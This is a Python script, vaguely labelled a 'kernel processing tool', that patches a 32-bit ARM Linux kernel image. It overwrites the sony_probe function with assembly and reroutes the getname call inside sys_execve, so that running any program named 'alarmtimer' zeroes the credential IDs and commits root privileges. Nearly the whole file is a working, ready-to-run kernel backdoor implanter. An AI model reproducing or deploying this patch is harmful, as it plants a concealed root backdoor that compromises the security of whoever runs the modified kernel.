#!/usr/bin/env python3

import os
import argparse
import subprocess

from elftools.elf.elffile import ELFFile
from keystone import *

# Initialize Keystone assembler for ARM (32-bit)

def hex_dump(data, length):
    offset = 0
    while offset < length:
        chunk = data[offset:offset+16]
        hex_values = ' '.join(f'{byte:02x}' for byte in chunk)
        ascii_values = ''.join(chr(byte) if 32 <= byte <= 127 else '.' for byte in chunk)
        print(f'{offset:08x}  {hex_values:<48}  |{ascii_values}|')
        offset += 16

def int_to_32bit_hex(value):
    # Handle negative numbers by using a mask for 32-bit overflow
    return hex((value + (1 << 32)) % (1 << 32))

def find_string_in_bytearray(data, search_string):
    search_bytes = search_string.encode('utf-8')  # Convert string to bytes
    offset = data.find(search_bytes)
    return offset


class KernelPatcher:
    def __init__(self, filename):
        self.verbose = True
        self.filename = filename
        self.directory_path = os.path.dirname(os.path.abspath(filename))
        self.kernel_elf = filename + '.elf'
        self.kernel_patched = filename + '.patched'
        self.ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
        if not os.path.exists(self.kernel_elf):
            subprocess.run(["vmlinux-to-elf", self.filename, self.kernel_elf], check=True)

    def find_symbol_offset(self, symbol_name):
        with open(self.kernel_elf, 'rb') as f:
            elffile = ELFFile(f)
            symtab = elffile.get_section_by_name('.symtab')
            if not symtab:
                return "Symbol table not found."

            for symbol in symtab.iter_symbols():
                if symbol.name == symbol_name:
                    return symbol['st_value']
        return "Symbol not found."
    
    def find_elf_base_address(self):
        with open(self.kernel_elf, 'rb') as f:
            elffile = ELFFile(f)
            for segment in elffile.iter_segments():
                if segment['p_type'] == 'PT_LOAD':
                    return segment['p_vaddr']
        return None

    def asm(self, asm_code: str):
        bytecode, length = self.ks.asm(asm_code)
        if 0 == length:
            raise RuntimeError("asm code didn't asm correctly")
        return bytes(bytecode)
    
    def apply_asm_patch(self, original_code: bytes, patch_offset: int, patch_asm: str):
        patch_code = self.asm(patch_asm)
        self.apply_byte_patch(original_code, patch_offset, patch_code)
        
    
    def apply_byte_patch(self, original_code: bytes, patch_offset: int, patch_code: bytes):
        if(self.verbose):
            print(f'[+] Writing to offset: {patch_offset} ({patch_offset:#x})')            
            hex_dump(patch_code, len(patch_code))

        original_code[patch_offset:patch_offset + len(patch_code)] = patch_code

    def do_patches(self):
        with open(self.filename, 'rb') as f:
            kernel_code = bytearray(f.read())

        BASE_ADDR = self.find_elf_base_address();
        BASE_CODE = self.find_symbol_offset("sony_probe") - BASE_ADDR
        addr_getname = self.find_symbol_offset("getname") - BASE_ADDR
        addr_printk =  self.find_symbol_offset("printk") - BASE_ADDR
        addr_prepare_creds = self.find_symbol_offset("prepare_creds") - BASE_ADDR
        addr_commit_creds = self.find_symbol_offset("commit_creds") - BASE_ADDR

        long_useless_message = "Please see the file Documentation/feature-removal-schedule.txt in the kernel source tree for more details"
        useless_msg_offset = find_string_in_bytearray(kernel_code, long_useless_message)
        if useless_msg_offset:
            self.apply_byte_patch(kernel_code, useless_msg_offset, b'\x00'*(len(long_useless_message)))
        else:
            raise RuntimeError("Couldn't find the string used to free up space...")
        
        string_offset = find_string_in_bytearray(kernel_code, "alarmtimer\x00")

        print(f'string_offset: {string_offset:#x}')
        
        print(f'BASE_CODE:                   {BASE_CODE:#x} {BASE_CODE+BASE_ADDR:#x}')
        print(f'getname:                     {addr_getname:#x} {addr_getname+BASE_ADDR:#x}')
        print(f'printk:                      {addr_printk:#x} {addr_printk+BASE_ADDR:#x}')
        print(f'prepare_creds:               {addr_prepare_creds:#x} {addr_prepare_creds+BASE_ADDR:#x}')
        print(f'commit_creds:                {addr_commit_creds:#x} {addr_commit_creds+BASE_ADDR:#x}')
        print(f'string_offset(alarmtimer):   {string_offset:#x} {string_offset+BASE_ADDR:#x}')

        asm_code = f"""
        // We protect ourselves and just return from this function if it is called
        PUSH    {{lr}}
        POP     {{pc}}

        // Entry for our code, this is where we'll have to jump to.
        // Save off some registers to restore later...
        PUSH    {{r4, r5, r6, r7, r8, r9, r10, lr}}
        
        // Do the call to getname since we're hijacking that bl 
        BL   #{int_to_32bit_hex(addr_getname-BASE_CODE)}

        // R0 is our return, we should store that somewhere
        MOV  r10, r0
        LDR  r6, ={string_offset+BASE_ADDR:#x}
        ADD  r0, r0, 2  //Remove first two chars, "./" from the command...

        start:
            LDRB r2, [r0], #1  // Load a byte from the first string into r2 and increment r0
            LDRB r3, [r6], #1  // Load a byte from the second string into r3 and increment r1
            CMP r2, r3         // Compare the two bytes
            BNE end            // Branch to not_equal if they are not the same
            CMP r2, #0         // Check if we've hit the null terminator
            BNE start          // If not, loop back and continue comparing
            // If we get here, strings are equal
        strings_equal:
            // Handle the strings being equal
            MOV r0, #0           // We must call prepare_creds with a NULL
            BL   #{int_to_32bit_hex(addr_prepare_creds-BASE_CODE)}
            MOV r1, #0           // We want to load zero into r1
            STR r1, [r0, #4]     // Write zero to offset 4 into the cred struct
            STR r1, [r0, #8]     // ...
            STR r1, [r0, #12]    // ...
            STR r1, [r0, #16]    // ...
            STR r1, [r0, #20]    // ...
            STR r1, [r0, #24]    // ...
            STR r1, [r0, #28]    // ...
            STR r1, [r0, #32]    // Write zero to offset 32 into the cred struct
            BL   #{int_to_32bit_hex(addr_commit_creds-BASE_CODE)}

        end:
        // Restore the result of getname so we can return that
        MOV r0, r10
        // Return
        POP    {{r4, r5, r6, r7, r8, r9, r10, pc}}
        """
        print(asm_code)
        
        self.apply_asm_patch(kernel_code, BASE_CODE, asm_code)

        # This should be the call to getname()... bl getname..
        patch_addr = self.find_symbol_offset("sys_execve") - BASE_ADDR + 0x10
        print(f'patch_addr:    {patch_addr:#x}, {patch_addr+BASE_ADDR:#x}')
        patch_code = f"""
        BL   #{int_to_32bit_hex((BASE_CODE+0x8)-patch_addr)}
        """
        self.apply_asm_patch(kernel_code, patch_addr, patch_code)

        with open(self.kernel_patched, 'wb') as f:
            f.write(kernel_code)

def main():
    parser = argparse.ArgumentParser(description='Kernel processing tool')
    parser.add_argument('-k', '--kernel', required=True, help='Input kernel file path', type=str)

    args = parser.parse_args()

    if not os.path.exists(args.kernel):
        parser.error(f"The file {args.kernel} does not exist!")
    
    patcher = KernelPatcher(args.kernel)
    patcher.do_patches()


if __name__ == "__main__":
    main()
